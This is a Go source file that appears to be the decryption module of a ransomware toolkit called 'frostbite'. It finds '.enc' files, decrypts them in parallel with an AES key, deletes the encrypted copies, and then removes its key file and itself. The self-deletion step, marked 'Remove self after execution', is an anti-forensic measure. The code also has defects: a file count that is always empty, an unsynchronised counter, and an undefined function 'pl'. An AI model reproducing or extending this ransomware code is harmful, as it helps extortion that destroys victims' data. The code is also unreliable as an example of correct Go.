package file

import (
	"fmt"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	cf "frostbite.com/coldfire"
	enc "frostbite.com/encryption"
	scan "frostbite.com/tools/scan"
)

func RunDencryptForCurrentDir(aesKey []byte) (fileList []string, err error) {
	timeToScan := time.Now()
	// get pwd
	currentDir, err := os.Getwd()
	if err != nil {
		return nil, err
	}
	DecryptFilesInDir(currentDir, true, aesKey)
	timeToScanEnd := time.Now()
	cf.PrintGood("Files found: " + strconv.Itoa(len(fileList)))
	cf.PrintInfo("Time to scan user files: " + timeToScanEnd.Sub(timeToScan).String())
	return fileList, nil
}
func DecryptFilesInDir(startDirPath string, skipHiddenDirs bool, aesKey []byte) error {
	// scan only non hidden directories
	runtime.GOMAXPROCS(runtime.NumCPU())
	filesToDecrypt, err := scan.ScanForEncFilesInDir(startDirPath, skipHiddenDirs)
	if err != nil {
		return err
	}

	wg := sync.WaitGroup{}
	wg.Add(len(filesToDecrypt))

	for _, filePath := range filesToDecrypt {
		go func(filePath string) {
			// decrypt file and remove .enc
			enc.DecryptFileAES(aesKey, filePath)
			os.Remove(filePath)
			wg.Done()
		}(filePath)
	}
	wg.Wait()

	//! Remove self after execution
	os.Remove("decrypted.key")
	cf.Remove()

	return nil
}
func UnlockFilesArray(filesToEncrypt []string, aesKey []byte) {
	// scan only non hidden directories

	// runtime.GOMAXPROCS(16)
	numCPU := runtime.NumCPU()
	if numCPU >= 4 {
		runtime.GOMAXPROCS(numCPU - 2)
	} else {
		runtime.GOMAXPROCS(1)
	}

	wg := sync.WaitGroup{}

	// limit the number of goroutines
	concurrencyLimit := numCPU * 2
	filesProcessed := 0
	for i := 0; i < len(filesToEncrypt); i += concurrencyLimit {
		// wait until there's room for another goroutine to start
		for j := 0; j < concurrencyLimit && i+j < len(filesToEncrypt); j++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()
				enc.DecryptFileAES(aesKey, filesToEncrypt[index])
				os.Remove(filesToEncrypt[index])
				filesProcessed++
			}(i + j)
		}

		// log the progress in percent
		percent := (float64(i) / float64(len(filesToEncrypt))) * 100
		// print progress in percent, limit to 2 decimal places
		fmt.Printf("Progress: %.2f%%\r", percent)
		wg.Wait()
	}
	pl("Files processed: ", filesProcessed)
	os.Remove("decrypted.key")
	cf.Remove()
}
